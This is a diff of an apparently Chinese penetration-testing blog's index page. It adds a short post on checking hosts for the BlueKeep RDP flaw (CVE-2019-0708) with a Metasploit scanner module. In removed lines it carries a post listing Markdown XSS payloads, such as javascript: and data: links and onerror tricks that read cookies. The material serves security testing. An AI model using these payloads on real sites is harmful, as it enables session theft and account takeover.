@@ -138,6 +138,49 @@
 		<div class="markdown-body home-categories">
 		
 			<div class="article">
+                <a class="clearlink" href="15595455557551.html">
+                
+                  <h1>使用 msf 检测 cve-2019-0708 WindowsRDP 远程代码执行漏洞</h1>
+                  <div class="a-content">
+                      
+                      <div class="a-content-text">
+                        
+                        	<p>MSF模块：<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb">https://github.com/rapid7/metasploit-framework/blob/master/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb</a></p>
+
+<p>前提：先在终端中更新 msf，使用命令<code>msfupdate</code>；如果没法更新，而 msf 版本又低就去 github 下载 msf 模块。</p>
+
+<p>现在开始验证：<br/>
+1、终端输入<code>msf</code>启动 msf<br/>
+2、使用 cve_2019_0708_bluekeep 模块：<code>use auxiliary/scanner/rdp/cve_2019_0708_bluekeep</code><br/>
+3、设置目标计算机 ip：<code>set RHOSTS 192.168.1.1</code>，如果是域名，可以先 ping 得出 ip 地址。<br/>
+4、输入<code>exploit</code>开始检测，如果出现方框中的内容，则表示漏洞存在（相关 ip 已打码）。</p>
+
+<p><figure><img src="media/15595455557551/15595462320619.jpg" alt=""/></figure></p>
+
+                        
+                      </div>
+                  </div>
+                </a>
+                <div class="read-more clearfix">
+                  <div class="more-left left">
+                  
+                    <span class="date">2019/6/3 15:5 下午</span>
+                    <span>posted in&nbsp;</span> 
+          				  
+          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
+          				   
+                  </div>
+                  <div class="more-right right">
+                  <span class="comments">
+                      
+
+                       
+                  </span>
+                  </div>
+                </div>
+              </div><!-- article -->
+        
+			<div class="article">
                 <a class="clearlink" href="15591786403220.html">
                 
                   <h1>双因素覆盖不全</h1>
@@ -512,86 +555,6 @@ Committed revision 1135.
                 </div>
               </div><!-- article -->
         
-			<div class="article">
-                <a class="clearlink" href="15586769387988.html">
-                
-                  <h1>Markdown XSS Payloads</h1>
-                  <div class="a-content">
-                      
-                      <div class="a-content-text">
-                        
-                        	<blockquote>
-<p>在测试某网站富文本编辑器时发现其使用了 markdown，md 会把文本转换成 html，那么肯定存在 xss 的问题，那么如何进行测试呢？于是我搜索了一番，发现前人已经有很好的研究成果了，但是鉴于安全问题的敏感，这里我就不贴原文出处了，不过感谢原作者JakobRPennington的贡献。</p>
-</blockquote>
-
-<p>Links</p>
-
-<pre class="line-numbers"><code class="language-md">[Basic](javascript:alert(&#39;Basic&#39;))
-[Local Storage](javascript:alert(JSON.stringify(localStorage)))
-[CaseInsensitive](JaVaScRiPt:alert(&#39;CaseInsensitive&#39;))
-[URL](javascript://www.google.com%0Aalert(&#39;URL&#39;))
-[In Quotes](&#39;javascript:alert(&quot;InQuotes&quot;)&#39;)
-</code></pre>
-
-<p>Images</p>
-
-<pre class="line-numbers"><code class="language-md">![Escape SRC - onload](https://www.example.com/image.png&quot;onload=&quot;alert(&#39;ImageOnLoad&#39;))
-![Escape SRC - onerror](&quot;onerror=&quot;alert(&#39;ImageOnError&#39;))
-</code></pre>
-
-<p>Fuzzing</p>
-
-<pre class="line-numbers"><code class="language-md">[XSS](javascript:prompt(document.cookie))
-[XSS](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
-[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[XSS](&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29)
-[XSS]: (javascript:prompt(document.cookie))
-[XSS](javascript:window.onerror=alert;throw%20document.cookie)
-[XSS](javascript://%0d%0aprompt(1))
-[XSS](javascript://%0d%0aprompt(1);com)
-[XSS](javascript:window.onerror=alert;throw%20document.cookie)
-[XSS](javascript://%0d%0awindow.onerror=alert;throw%20document.cookie)
-[XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
-[XSS](vbscript:alert(document.domain))
-[XSS](javascript:this;alert(1))
-[XSS](javascript:this;alert(1&amp;#41;)
-[XSS](javascript&amp;#58this;alert(1&amp;#41;)
-[XSS](Javas&amp;#99;ript:alert(1&amp;#41;)
-[XSS](Javas%26%2399;ript:alert(1&amp;#41;)
-[XSS](javascript:alert&amp;#65534;(1&amp;#41;)
-[XSS](javascript:confirm(1)
-[XSS](javascript://www.google.com%0Aprompt(1))
-[XSS](javascript://%0d%0aconfirm(1);com)
-[XSS](javascript:window.onerror=confirm;throw%201)
-[XSS](�javascript:alert(document.domain&amp;#41;)
-![XSS](javascript:prompt(document.cookie))\
-![XSS](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)\
-![XSS&#39;&quot;`onerror=prompt(document.cookie)](x)\
-</code></pre>
-
-                        
-                      </div>
-                  </div>
-                </a>
-                <div class="read-more clearfix">
-                  <div class="more-left left">
-                  
-                    <span class="date">2019/5/24 13:48 下午</span>
-                    <span>posted in&nbsp;</span> 
-          				  
-          					    <span class="posted-in"><a href='%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95.html'>渗透测试</a></span>
-          				   
-                  </div>
-                  <div class="more-right right">
-                  <span class="comments">
-                      
-
-                       
-                  </span>
-                  </div>
-                </div>
-              </div><!-- article -->
-        
               
 
 
@@ -677,6 +640,12 @@ Committed revision 1135.
 	      
 		      
 			      <li class="post">
+			        <a href="15643634653227.html">manjaro 安装 vmtools</a>
+			      </li>
+		     
+		  
+		      
+			      <li class="post">
 			        <a href="15642124072307.html">Mutillidae 遇到的一个奇怪问题</a>
 			      </li>
 		     
@@ -696,12 +665,6 @@ Committed revision 1135.
 		      
 			      <li class="post">
 			        <a href="15638711886127.html">Archiso</a>
-			      </li>
-		     
-		  
-		      
-			      <li class="post">
-			        <a href="15611953556975.html">archlinux 安装 vmtools 遇到坑了怎么办</a>
 			      </li>
 		     
 		  
